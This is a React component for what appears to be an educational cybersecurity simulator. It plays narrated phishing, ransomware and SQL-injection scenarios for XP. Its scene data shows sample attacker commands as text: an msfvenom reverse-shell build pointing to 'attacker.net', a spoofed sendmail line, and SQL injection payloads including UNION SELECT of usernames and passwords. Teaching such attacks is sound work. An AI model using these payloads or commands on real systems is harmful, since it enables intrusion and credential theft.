'use client';

import React, { useState, useEffect } from 'react';
import { useXPSystem } from '@/context/XPSystem';
import { 
  Play, 
  Pause, 
  RotateCcw, 
  Terminal, 
  Globe, 
  User, 
  Server, 
  ShieldAlert, 
  CheckCircle,
  Mail,
  Lock,
  Database,
  ArrowRight,
  Monitor,
  Folder,
  FileSpreadsheet,
  AlertTriangle
} from 'lucide-react';

interface Scene {
  attackerText: string;
  victimText: string;
  narrative: string;
  attackerCode?: string;
  victimUiState: 'normal' | 'loading' | 'phishing-email' | 'phishing-login' | 'compromised' | 'infected' | 'encrypting' | 'ransom-screen' | 'sqli-search' | 'sqli-leak';
}

interface CinemaStory {
  id: string;
  title: string;
  description: string;
  xpReward: number;
  achievementId: string;
  achievementTitle: string;
  achievementDesc: string;
  achievementIcon: string;
  icon: any;
  scenes: Scene[];
}

const CINEMA_STORIES: Record<string, CinemaStory> = {
  phishing: {
    id: 'phishing',
    title: 'Phishing Credential Harvest',
    description: 'Watch how attackers clone trusted portals, deliver spoofed emails, and steal target authentication tokens in real-time.',
    xpReward: 50,
    achievementId: 'phishing_explorer',
    achievementTitle: 'Phishing Inspector',
    achievementDesc: 'Completed the Phishing Cinema simulation',
    achievementIcon: '🎣',
    icon: Mail,
    scenes: [
      {
        attackerText: '> Setting up cloned target page on dark infrastructure...\n> Hosting credential-harvester listener on port 8080...',
        victimText: 'User is reviewing the standard company dashboard workspace.',
        narrative: 'Step 1: The attacker constructs a exact visual clone of the corporate login portal and starts an automated credentials logging server.',
        attackerCode: 'git clone https://github.com/cloner/portal && python3 -m http.server 8080',
        victimUiState: 'normal'
      },
      {
        attackerText: '> Crafting spoofed email headers to bypass SPF/DKIM validation...\n> Subject: "URGENT: Password Expiry Notification"\n> Injecting malicious link...',
        victimText: 'Outlook Mail: An urgent security warning arrives from a sender labeled "IT Administration Support".',
        narrative: 'Step 2: Attacker delivers a highly urgent message designed to trigger panic, urging the victim to change their password.',
        attackerCode: 'sendmail -f admin@trusted-company.com victim@company.com < payload.eml',
        victimUiState: 'phishing-email'
      },
      {
        attackerText: '> Listening for inbound connection on clone server...\n> [192.168.1.100] Victim clicked. Rendering login clone...',
        victimText: 'Clicking the link redirects the user to what looks exactly like the Office 365 workspace authorization page.',
        narrative: 'Step 3: Clicking the verification link launches the cloned login form. The domain in the address bar is slightly modified (e.g. login-security-check.com).',
        victimUiState: 'phishing-login'
      },
      {
        attackerText: '> [!] CREDENTIALS INTERCEPTED:\n> USERNAME: zahid_admin\n> PASSWORD: TempPassword2026!\n> Generating administrative backdoor session...',
        victimText: 'Entering password credentials into portal field.',
        narrative: 'Step 4: The victim enters their Active Directory credentials. The cloned portal submits these directly to the attacker\'s database.',
        attackerCode: 'cat credentials.log',
        victimUiState: 'loading'
      },
      {
        attackerText: '> [√] Authentication successful.\n> [√] Session Hijacked.\n> Operator level upgraded to SYSTEM. Full target compromise complete.',
        victimText: '[!] CRITICAL SECURITY COMPROMISE: Attacker logged in from foreign geolocation and stole database records.',
        narrative: 'Step 5: Attacker logs in using stolen credentials and takes absolute control of the corporate database.',
        victimUiState: 'compromised'
      }
    ]
  },
  ransomware: {
    id: 'ransomware',
    title: 'Ransomware Infection Lifecycle',
    description: 'Anatomy of a modern malware attack: local environment staging, key generation, encryption loop, and ransom screen setup.',
    xpReward: 60,
    achievementId: 'ransomware_explorer',
    achievementTitle: 'Malware Biologist',
    achievementDesc: 'Completed the Ransomware Lifecycle simulation',
    achievementIcon: '🧬',
    icon: Lock,
    scenes: [
      {
        attackerText: '> Preparing payload.exe with customized cryptor...\n> Staging payload on temporary server node...',
        victimText: 'Opening Windows File Explorer to search for spreadsheet attachments.',
        narrative: 'Step 1: Attacker sends malware embedded inside a macros-enabled spreadsheet labeled "Q1_Financial_Report.xlsm".',
        attackerCode: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker.net -f exe > expense.exe',
        victimUiState: 'normal'
      },
      {
        attackerText: '> Waiting for callback connection...\n> [!] Active target connection established.\n> Staging local script execution in payload folder...',
        victimText: 'Workbook opened. Excel displays security warning: "Macros have been disabled. [Enable Content]".',
        narrative: 'Step 2: The victim opens the spreadsheet and clicks "Enable Content". This activates the VBA macro script containing the malware execution sequence.',
        victimUiState: 'infected'
      },
      {
        attackerText: '> Spawning background processes...\n> Checking for sandbox debugger presence: None.\n> Loading AES-256 encryption module...',
        victimText: 'Antivirus scan running in tray. CPU usage spiking.',
        narrative: 'Step 3: The macro script downloads the primary ransomware executable in the background. It connects to the C2 server to fetch encryption keys.',
        attackerCode: 'python3 -m c2_server --get-key',
        victimUiState: 'loading'
      },
      {
        attackerText: '> Sending unique public key...\n> Initiating multi-threaded encryption on /Documents, /Desktop, /Pictures...',
        victimText: 'Live Encryption Loop: Cell data and documents are being locked and scrambled into gibberish one-by-one.',
        narrative: 'Step 4: The cryptor begins local folder traversal, encrypting documents and data cells in memory. User cells turn to junk data.',
        attackerCode: 'crypt_traverse --dir C:\\Users\\Victim --key <KEY>',
        victimUiState: 'encrypting'
      },
      {
        attackerText: '> Encryption routine complete.\n> Pushing visual threat notification onto target monitor.',
        victimText: 'All corporate files encrypted. Red ransom banner overrides user control.',
        narrative: 'Step 5: The encryption sweep finishes. It deletes shadow backups and launches a full-screen warning window demanding payment.',
        victimUiState: 'ransom-screen'
      }
    ]
  },
  sqli: {
    id: 'sqli',
    title: 'SQL Database Bypass & Hijack',
    description: 'Simulating vulnerability detection via injection, query manipulation to bypass authentication, and direct table structure dump.',
    xpReward: 55,
    achievementId: 'sqli_explorer',
    achievementTitle: 'SQL Database Hijacker',
    achievementDesc: 'Completed the SQL Injection Cinema simulation',
    achievementIcon: '💾',
    icon: Database,
    scenes: [
      {
        attackerText: '> Probing target search endpoints for unexpected input behavior...\n> Sending standard input parameter: Zahid\'',
        victimText: 'Searching database records. Server outputs structural query parsing fault.',
        narrative: 'Step 1: Attacker tests search forms by entering quote marks, forcing database compilation errors that prove injection capability.',
        attackerCode: 'curl "http://target.com/products?search=gadget\'"',
        victimUiState: 'sqli-search'
      },
      {
        attackerText: '> Crafting query bypass logic for administrators login...\n> Payload: admin\' OR 1=1 --',
        victimText: 'Attempting authentication request check.',
        narrative: 'Step 2: Attacker types a logic bypass payload into the administrator login prompt. The OR query forces a True validation.',
        attackerCode: 'curl -d "user=admin\' OR 1=1 --" http://target.com/login',
        victimUiState: 'loading'
      },
      {
        attackerText: '> [!] Bypass Successful. Session admin cookies retrieved.\n> Accessing main portal dashboard console.',
        victimText: 'Dashboard loads successfully without asking for correct passwords.',
        narrative: 'Step 3: The database accepts the bypass logic, logging the attacker into the system administration console.',
        victimUiState: 'compromised'
      },
      {
        attackerText: '> Crafting database schema extraction query via UNION operators...\n> Payload: UNION SELECT null, username, password FROM users --',
        victimText: 'Executing search joins across credentials databases.',
        narrative: 'Step 4: Attacker uses UNION select keywords to join the products search query with sensitive user logs records.',
        attackerCode: 'curl "http://target.com/search?q=a\' UNION SELECT 1,username,password FROM users --"',
        victimUiState: 'sqli-search'
      },
      {
        attackerText: '> [!] Data retrieved successfully.\n> Dumping admin hashed credentials...\n> Zahid_admin | $2a$10$M9DdH...',
        victimText: 'Leaked corporate hashes are dumped directly into the search matches grid.',
        narrative: 'Step 5: Database returns user hashes straight onto the front-end page layout. Attack complete.',
        victimUiState: 'sqli-leak'
      }
    ]
  }
};

export default function CinemaPlayer({ storyId, onClose }: { storyId: string; onClose: () => void }) {
  const { addXP, unlockAchievement } = useXPSystem();
  const story = CINEMA_STORIES[storyId];

  const [currentSceneIdx, setCurrentSceneIdx] = useState(0);
  const [isPlaying, setIsPlaying] = useState(true);
  const [isMuted, setIsMuted] = useState(false);

  const [scrambleTick, setScrambleTick] = useState(0);
  const [displayedCode, setDisplayedCode] = useState('');

  const scene = story.scenes[currentSceneIdx];

  // Attacker command typing simulator logic
  useEffect(() => {
    if (!scene.attackerCode) {
      setDisplayedCode('');
      return;
    }
    setDisplayedCode('');
    let idx = 0;
    const fullCode = scene.attackerCode;
    const typingInterval = setInterval(() => {
      setDisplayedCode(fullCode.substring(0, idx + 1));
      idx++;
      if (idx >= fullCode.length) {
        clearInterval(typingInterval);
      }
    }, 25);
    return () => clearInterval(typingInterval);
  }, [currentSceneIdx, scene.attackerCode]);

  // Unified Audio playback & slide advance control loop
  useEffect(() => {
    if (!isPlaying) {
      if (typeof window !== 'undefined' && 'speechSynthesis' in window) {
        window.speechSynthesis.cancel();
      }
      return;
    }

    let advanceTimer: NodeJS.Timeout;
    let safeguardTimer: NodeJS.Timeout;

    const handleAdvance = () => {
      if (currentSceneIdx < story.scenes.length - 1) {
        setCurrentSceneIdx(prev => prev + 1);
      } else {
        setIsPlaying(false);
        addXP(story.xpReward);
        unlockAchievement(
          story.achievementId,
          story.achievementTitle,
          story.achievementDesc,
          story.achievementIcon
        );
      }
    };

    if (typeof window !== 'undefined' && 'speechSynthesis' in window && !isMuted) {
      window.speechSynthesis.cancel();
      const utterance = new SpeechSynthesisUtterance(scene.narrative);
      const voices = window.speechSynthesis.getVoices();
      const indianVoice = voices.find(
        v => v.lang.startsWith('en-IN') || v.lang.startsWith('en-in') || v.name.includes('India') || v.name.includes('Indian')
      );
      if (indianVoice) {
        utterance.voice = indianVoice;
      }
      utterance.rate = 1.0;
      
      // Advance to next scene 800ms after current sentence finished reading
      utterance.onend = () => {
        advanceTimer = setTimeout(handleAdvance, 800);
      };

      // Safeguard: if browser API fails or hangs, advance after 14 seconds anyway
      safeguardTimer = setTimeout(handleAdvance, 14000);

      window.speechSynthesis.speak(utterance);

      return () => {
        clearTimeout(advanceTimer);
        clearTimeout(safeguardTimer);
        window.speechSynthesis.cancel();
      };
    } else {
      // Fallback/Muted path: advance strictly after 7.5 seconds
      advanceTimer = setTimeout(handleAdvance, 7500);
      return () => clearTimeout(advanceTimer);
    }
  }, [currentSceneIdx, isPlaying, isMuted, story]);

  // Handle cell scrambling tick timer during encryption scene
  useEffect(() => {
    if (scene.victimUiState === 'encrypting') {
      const interval = setInterval(() => {
        setScrambleTick(prev => (prev + 1) % 15);
      }, 350);
      return () => clearInterval(interval);
    }
  }, [scene.victimUiState]);

  return (
    <div className="fixed inset-0 z-50 bg-[#FFFCF7]/95 flex flex-col font-sans text-text-primary">
      
      {/* Header */}
      <header className="p-4 border-b border-warm-300 bg-white flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-2.5 h-2.5 rounded-full bg-accent-primary animate-pulse" />
          <div>
            <h2 className="text-xl font-serif font-medium text-text-primary">{story.title}</h2>
            <p className="text-xs text-text-muted mt-0.5">Scene {currentSceneIdx + 1} of {story.scenes.length}</p>
          </div>
        </div>

        <div className="flex items-center gap-4">
          {/* Mute button */}
          <button
            onClick={() => setIsMuted(!isMuted)}
            className="p-2 bg-warm-100 hover:bg-warm-200 border border-warm-300 rounded-xl text-xs font-bold transition-all text-text-primary flex items-center gap-1.5"
            title={isMuted ? "Unmute Voice Narration" : "Mute Voice Narration"}
          >
            {isMuted ? "🔇 Voice Muted" : "🔊 Indian Accent Narration"}
          </button>
          
          <button 
            onClick={onClose}
            className="px-4 py-2 bg-warm-100 hover:bg-red-50 border border-warm-300 hover:border-red-200 rounded-xl text-xs font-bold text-text-primary hover:text-red-600 transition-colors"
          >
            Exit Cinema
          </button>
        </div>
      </header>

      {/* Main Split Screen Area */}
      <main className="flex-1 grid grid-cols-1 lg:grid-cols-2 p-6 gap-6 overflow-hidden bg-[#fafafa]">
        
        {/* Left Side: Attacker Console View (IMPRESSIVE NEON CYBERSECURITY HACKER SYSTEM) */}
        <div className="bg-black border-2 border-red-500 rounded-xl overflow-hidden flex flex-col relative shadow-[0_0_30px_rgba(239,68,68,0.25)]">
          {/* CRT scanline effect layer */}
          <div className="absolute inset-0 pointer-events-none z-10 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%)] bg-[length:100%_4px]" />
          
          {/* Neon header banner with Hacker Mask Avatar */}
          <div className="bg-[#0c0a0f] px-4 py-3 border-b-2 border-red-950/60 flex items-center justify-between z-20">
            <div className="flex items-center gap-3">
              {/* Animated Hacker Mask Avatar (Anonymous Mask SVG) */}
              <div className="w-10 h-10 rounded-lg bg-red-950/40 border border-red-500/50 flex items-center justify-center relative overflow-hidden group shadow-[0_0_15px_rgba(239,68,68,0.2)]">
                <svg className="w-7 h-7 text-red-500 animate-[pulse_2s_infinite]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9.75 9.75l4.5 4.5m0-4.5l-4.5 4.5M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  <path d="M12 18.5a6.5 6.5 0 01-6.5-6.5h13a6.5 6.5 0 01-6.5 6.5z" fill="currentColor" fillOpacity="0.2" />
                  <path d="M8 11.5c.5-1 1.5-1.5 2-1.5s1.5.5 2 1.5M12 11.5c.5-1 1.5-1.5 2-1.5s1.5.5 2 1.5" />
                  <path d="M11 16.5h2" strokeWidth="2.5" strokeLinecap="round" />
                </svg>
              </div>
              <div>
                <div className="text-red-500 font-mono text-xs font-bold tracking-widest uppercase flex items-center gap-2 animate-pulse">
                  <span className="w-2 h-2 rounded-full bg-red-600"></span>
                  OPERATOR_CONSOLE://ANONYMOUS_STAGING
                </div>
                <span className="text-[9px] font-mono text-gray-500 uppercase tracking-widest">Active Inbound Inject Payload Link</span>
              </div>
            </div>
            <span className="text-[10px] text-red-500 font-mono font-bold tracking-widest animate-pulse border border-red-900/60 px-2 py-0.5 rounded bg-red-950/20">
              SYS_OVERRIDE
            </span>
          </div>

          {/* Matrix code stream rain back panel */}
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(0,0,0,0.85)_0%,#000_100%)] z-0" />
          
          <div className="flex-1 p-5 font-mono text-xs md:text-sm overflow-y-auto space-y-4 text-emerald-400 leading-relaxed custom-scrollbar relative z-10 bg-transparent">
            <div className="text-red-500/80 font-bold border-b border-red-950/30 pb-2 mb-2 flex justify-between items-center text-[10px]">
              <span>// INTRUSION FLOW STATE COMPLIANCE</span>
              <span className="animate-pulse">ONLINE ●</span>
            </div>
            
            <pre className="whitespace-pre-wrap font-sans text-xs bg-red-950/30 border border-red-900/30 p-3.5 rounded-lg text-red-400 shadow-inner">
              {scene.attackerText}
            </pre>

            {scene.attackerCode && (
              <div className="space-y-2 mt-4">
                <div className="text-[10px] text-gray-500 font-bold tracking-wider">// Command Payload Stream</div>
                <code className="block bg-black/90 p-4 border border-red-950 rounded-lg text-cyan-400 font-bold select-all text-xs shadow-[0_0_15px_rgba(6,182,212,0.05)]">
                  {displayedCode}
                  <span className="animate-pulse bg-cyan-400 ml-1 inline-block w-1.5 h-3.5"></span>
                </code>
              </div>
            )}
          </div>
        </div>

        {/* Right Side: Victim UI/Screen View (COMPLETELY REAL RECONSTRUCTED DESKTOP/APP VIEWPORTS) */}
        <div className="bg-white border-2 border-warm-300 rounded-xl overflow-hidden flex flex-col shadow-lg">
          <div className="bg-warm-100 px-4 py-2 border-b border-warm-300 flex items-center justify-between text-text-secondary text-xs font-bold font-sans">
            <span className="flex items-center gap-1.5">
              <Monitor className="w-4 h-4 text-accent-primary" />
              VICTIM_ENVIRONMENT: zahid_workstation_pc
            </span>
            <span className="text-[10px] text-text-muted">OS: Windows 11</span>
          </div>

          <div className="flex-1 p-4 bg-warm-200 relative overflow-hidden flex flex-col justify-center items-center">
            
            {/* 1. Office Dashboard View / Windows Desktop File Manager */}
            {scene.victimUiState === 'normal' && (
              <div className="w-full h-full bg-[#f3f4f6] rounded-lg border border-gray-300 flex flex-col overflow-hidden shadow-inner">
                {/* Windows top bar */}
                <div className="bg-white px-3 py-2 border-b border-gray-200 flex justify-between items-center text-xs text-gray-700">
                  <span>File Explorer - Documents</span>
                  <div className="flex gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-gray-300" />
                    <span className="w-2.5 h-2.5 rounded-full bg-gray-300" />
                  </div>
                </div>
                <div className="flex-1 p-4 grid grid-cols-4 gap-4 bg-white/70">
                  <div className="flex flex-col items-center gap-1 p-2 hover:bg-blue-100/50 rounded cursor-pointer">
                    <Folder className="w-10 h-10 text-yellow-500" />
                    <span className="text-[10px] text-gray-800 text-center truncate w-full">Q1 Audit logs</span>
                  </div>
                  <div className="flex flex-col items-center gap-1 p-2 hover:bg-blue-100/50 rounded cursor-pointer">
                    <FileSpreadsheet className="w-10 h-10 text-emerald-600 animate-pulse" />
                    <span className="text-[10px] font-bold text-gray-800 text-center truncate w-full">Q1_Financial_Report.xlsm</span>
                  </div>
                </div>
              </div>
            )}

            {/* 2.Spoofed Outlook Email Client */}
            {scene.victimUiState === 'phishing-email' && (
              <div className="w-full h-full bg-white rounded-lg border border-gray-300 flex flex-col overflow-hidden shadow-md">
                <div className="bg-blue-800 text-white px-4 py-2.5 flex items-center justify-between text-xs font-bold">
                  <span>Outlook Web Portal</span>
                  <div className="text-[10px] bg-blue-700 px-2 py-0.5 rounded">Inbox (1)</div>
                </div>
                <div className="flex-1 flex overflow-hidden">
                  <div className="w-1/3 border-r border-gray-200 p-2 bg-gray-50 text-[10px] space-y-2">
                    <div className="bg-blue-100/60 p-2 rounded border-l-4 border-blue-500 font-bold">
                      <div>IT-Admin</div>
                      <div className="text-gray-500 truncate">Password Validation Alert...</div>
                    </div>
                  </div>
                  <div className="flex-1 p-4 space-y-4 overflow-y-auto">
                    <div className="border-b border-gray-100 pb-3">
                      <h4 className="text-xs font-bold text-gray-800">IT SUPPORT: PASSWORD VERIFICATION REQUEST</h4>
                      <p className="text-[9px] text-gray-400 mt-1">From: support@trusted-company-security.com (External)</p>
                    </div>
                    <div className="text-xs text-gray-700 space-y-2 leading-relaxed">
                      <p>Dear Administrator,</p>
                      <p className="font-semibold text-red-600">
                        Security scan detected your password expires in 2 hours.
                      </p>
                      <p>Please authenticate using our secure single-sign-on verification link below to confirm credentials:</p>
                      <div className="py-2">
                        <span className="inline-block px-4 py-2 bg-blue-600 text-white text-xs font-bold rounded-lg cursor-pointer hover:bg-blue-700">
                          Verify Active Directory Password
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* 3. Microsoft Office 365 Spoofed Portal */}
            {scene.victimUiState === 'phishing-login' && (
              <div className="w-full h-full bg-[#f3f4f6] rounded-lg border border-gray-300 flex flex-col overflow-hidden shadow-md">
                <div className="bg-white px-3 py-1.5 border-b border-gray-200 flex items-center gap-2 text-[10px] text-gray-500">
                  <Globe className="w-3 h-3 text-emerald-600" />
                  <span className="truncate text-red-600 font-mono font-bold">https://login-security-check.com/microsoft/auth</span>
                </div>
                <div className="flex-1 flex items-center justify-center bg-cover bg-center p-4" style={{ backgroundImage: "url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=400')" }}>
                  <div className="w-full max-w-[280px] bg-white p-5 rounded shadow-xl border border-gray-200 space-y-4">
                    <div className="space-y-1">
                      <div className="w-6 h-6 bg-red-500" /> {/* Microsoft logo placeholder */}
                      <h3 className="text-sm font-bold text-gray-800">Sign In</h3>
                    </div>
                    <div className="space-y-2">
                      <input 
                        type="text" 
                        value="zahid_admin@trusted-company.com" 
                        readOnly
                        className="w-full border-b border-gray-400 focus:border-blue-600 outline-none py-1 text-xs" 
                      />
                      <input 
                        type="password" 
                        value="••••••••••••" 
                        readOnly
                        className="w-full border-b border-gray-400 focus:border-blue-600 outline-none py-1 text-xs" 
                      />
                    </div>
                    <button className="w-full py-1.5 bg-blue-600 text-white text-xs font-semibold rounded hover:bg-blue-700 transition-colors">
                      Next
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* 4. Loader screen */}
            {scene.victimUiState === 'loading' && (
              <div className="w-full h-full bg-[#f3f4f6] rounded-lg border border-gray-300 flex flex-col items-center justify-center shadow-md">
                <div className="w-8 h-8 border-2 border-accent-primary border-t-transparent rounded-full animate-spin mb-3" />
                <p className="text-xs text-text-secondary font-medium">{scene.victimText}</p>
              </div>
            )}

            {/* 5. Security Warn / Compromised overlay */}
            {scene.victimUiState === 'compromised' && (
              <div className="w-full h-full bg-[#fef2f2] rounded-lg border-2 border-red-200 flex flex-col items-center justify-center p-6 text-center space-y-4 shadow-md">
                <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center text-red-600">
                  <ShieldAlert className="w-9 h-9" />
                </div>
                <h3 className="text-lg font-bold text-red-700">Security Compromise Warning</h3>
                <p className="text-xs text-gray-600 max-w-xs leading-relaxed">{scene.victimText}</p>
                <div className="bg-red-50 border border-red-200 p-2.5 rounded text-[10px] font-mono text-red-800">
                  EVENT CODE: ANOMALOUS_SSO_BACKDOOR_LAUNCH
                </div>
              </div>
            )}

            {/* 6. Malware macros opened spreadsheet */}
            {scene.victimUiState === 'infected' && (
              <div className="w-full h-full bg-white rounded-lg border border-gray-300 flex flex-col overflow-hidden shadow-md">
                {/* Excel Ribbon */}
                <div className="bg-[#107c41] text-white px-3 py-1 flex items-center justify-between text-[10px] font-bold">
                  <span>Q1_Financial_Report.xlsm - Microsoft Excel</span>
                </div>
                {/* Warning macros header */}
                <div className="bg-[#fff2cc] border-b border-yellow-200 px-3 py-2 flex items-center justify-between text-[10px] text-yellow-900">
                  <div className="flex items-center gap-1.5">
                    <AlertTriangle className="w-3.5 h-3.5 text-yellow-600" />
                    <span className="font-bold">SECURITY WARNING: Active Macros are disabled.</span>
                  </div>
                  <button className="px-3 py-1 bg-white hover:bg-yellow-100 border border-yellow-300 font-bold text-yellow-900 rounded shadow-sm">
                    Enable Content
                  </button>
                </div>
                {/* Spreadsheet grid */}
                <div className="flex-1 bg-white grid grid-cols-4 grid-rows-5 text-[10px] border-collapse font-sans text-gray-800">
                  {['A', 'B', 'C', 'D', 'Revenue', '$120,000', 'Pending', 'OK', 'Q1 Expenses', '$84,000', 'Approved', 'IT-Audit', 'Consult', '$15,000', 'Draft', 'IT-Secure', 'Net Margin', '$21,000', 'Locked', 'Pending'].map((cell, idx) => (
                    <div key={idx} className="border border-gray-200 p-2 flex items-center font-mono">
                      {cell}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* 7. Live Scrambling Cell Encrypting Animation */}
            {scene.victimUiState === 'encrypting' && (
              <div className="w-full h-full bg-white rounded-lg border border-gray-300 flex flex-col overflow-hidden shadow-md">
                <div className="bg-[#107c41] text-white px-3 py-1 flex items-center justify-between text-[10px] font-bold">
                  <span>Q1_Financial_Report.xlsm - Microsoft Excel</span>
                </div>
                {/* Grid layout with scrambled text and red highlight alerts */}
                <div className="flex-1 bg-white grid grid-cols-4 grid-rows-5 text-[9px] border-collapse font-mono text-gray-800">
                  {[
                    'A', 'B', 'C', 'D', 
                    'Revenue', '$120,000', 'Pending', 'OK', 
                    'Q1 Expenses', '$84,000', 'Approved', 'IT-Audit', 
                    'Consult', '$15,000', 'Draft', 'IT-Secure', 
                    'Net Margin', '$21,000', 'Locked', 'Pending'
                  ].map((cell, idx) => {
                    const isEncrypted = idx >= 4 && (idx - 4) < scrambleTick;
                    return (
                      <div 
                        key={idx} 
                        className={`border p-2 flex flex-col justify-center transition-all ${
                          isEncrypted 
                            ? 'bg-red-50 border-red-200 text-red-600 font-bold' 
                            : 'border-gray-200 text-gray-700'
                        }`}
                      >
                        {isEncrypted ? (
                          <>
                            <span className="animate-pulse">🔒 [LOCKED_AES]</span>
                            <span className="text-[7px] text-red-400">Scrambled...</span>
                          </>
                        ) : cell}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* 8. Fullscreen Lock Warning Ransom Screen */}
            {scene.victimUiState === 'ransom-screen' && (
              <div className="w-full h-full bg-red-700 rounded-lg border border-red-800 flex flex-col justify-between p-6 text-white text-center shadow-xl relative animate-pulse">
                <div className="space-y-3">
                  <Lock className="w-12 h-12 mx-auto text-white" />
                  <h3 className="text-base font-extrabold tracking-wider uppercase">ALL FILES ARE ENCRYPTED</h3>
                  <p className="text-[10px] text-red-100 leading-normal max-w-sm mx-auto">
                    Your local Excel files, databases, credentials keys, and images are locked using strong asymmetric AES-256 protocols.
                  </p>
                </div>
                <div className="bg-black/30 border border-red-900 p-2.5 rounded text-[9px] font-mono break-all text-red-200">
                  BTC Wallet Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
                </div>
                <span className="text-[8px] text-red-300">Decryption key expires in: 48 Hours.</span>
              </div>
            )}

            {/* 9. Product Search SQLi Vulnerability Testing */}
            {scene.victimUiState === 'sqli-search' && (
              <div className="w-full h-full bg-[#f9fafb] rounded-lg border border-gray-300 flex flex-col overflow-hidden shadow-md">
                <div className="bg-white px-3 py-2 border-b border-gray-200 flex justify-between items-center text-xs font-bold text-gray-800">
                  <span>Corporate Product Catalog</span>
                </div>
                <div className="p-4 space-y-4">
                  <div className="flex gap-2">
                    <input 
                      type="text" 
                      value={currentSceneIdx === 0 ? "Zahid'" : "gadget' UNION SELECT 1,username,password FROM users --"} 
                      readOnly
                      className="flex-1 bg-white border border-gray-300 rounded px-2.5 py-1.5 text-xs text-text-primary font-mono outline-none" 
                    />
                    <button className="px-4 py-1.5 bg-accent-primary text-white text-xs font-semibold rounded">Search</button>
                  </div>
                  {currentSceneIdx === 0 ? (
                    <div className="p-3 bg-red-50 border border-red-200 text-[10px] text-red-700 font-mono rounded">
                      Server Output: SQLite Exception near line 1: Syntax error
                    </div>
                  ) : (
                    <div className="p-3 bg-emerald-50 border border-emerald-200 text-[10px] text-emerald-800 font-mono rounded">
                      SQL Query successful: returning Joined Database columns.
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* 10. Database schema output leak */}
            {scene.victimUiState === 'sqli-leak' && (
              <div className="w-full h-full bg-[#f9fafb] rounded-lg border border-gray-300 flex flex-col overflow-hidden shadow-md">
                <div className="bg-white px-3 py-2 border-b border-gray-200 flex justify-between items-center text-xs font-bold text-red-600">
                  <span>[!] UNSECURED USERS DATA DUMPED</span>
                </div>
                <div className="p-4 overflow-y-auto">
                  <table className="w-full text-[9px] font-mono text-gray-700 border-collapse">
                    <thead>
                      <tr className="border-b border-gray-200 text-gray-500">
                        <th className="py-1 text-left">UID</th>
                        <th className="py-1 text-left">User</th>
                        <th className="py-1 text-left">Password Hash</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-gray-100 bg-red-50/50">
                        <td className="py-1 text-red-600 font-bold">1</td>
                        <td className="py-1">admin</td>
                        <td className="py-1">$2a$10$M9DdH...</td>
                      </tr>
                      <tr className="border-b border-gray-100 bg-red-50/50">
                        <td className="py-1 text-red-600 font-bold">2</td>
                        <td className="py-1">zahid_admin</td>
                        <td className="py-1">$2a$10$22aX4...</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            )}

          </div>
        </div>

      </main>

      {/* Narrator and Playback Control Panel */}
      <footer className="p-6 border-t border-warm-300 bg-white flex flex-col md:flex-row items-center gap-6 justify-between shadow-inner">
        
        {/* Narrative description Box */}
        <div className="flex-1 space-y-1.5">
          <span className="text-[10px] uppercase font-black tracking-widest text-accent-primary block">NARRATOR STEP ANALYSIS</span>
          <p className="text-sm text-text-secondary leading-relaxed font-medium">
            {scene.narrative}
          </p>
        </div>

        {/* Controls block */}
        <div className="flex items-center gap-4 shrink-0">
          <button
            onClick={() => setCurrentSceneIdx(0)}
            className="p-2.5 bg-warm-100 hover:bg-warm-200 rounded-xl border border-warm-300 text-text-primary transition-colors"
            title="Restart Scene Story"
          >
            <RotateCcw className="w-4 h-4" />
          </button>
          
          <button
            onClick={() => setIsPlaying(!isPlaying)}
            className="px-6 py-2.5 bg-accent-primary hover:bg-accent-primary/95 text-white font-bold rounded-xl flex items-center gap-2 transition-all shadow-md"
          >
            {isPlaying ? (
              <>
                <Pause className="w-4 h-4 fill-current" /> Pause Demo
              </>
            ) : (
              <>
                <Play className="w-4 h-4 fill-current" /> Play Story
              </>
            )}
          </button>

          {currentSceneIdx === story.scenes.length - 1 && !isPlaying && (
            <div className="flex items-center gap-1.5 px-3 py-1.5 bg-emerald-100 border border-emerald-300 text-emerald-800 rounded-lg text-xs font-bold animate-pulse">
              <CheckCircle className="w-4 h-4" /> Completed (+{story.xpReward} XP)
            </div>
          )}
        </div>
      </footer>
    </div>
  );
}
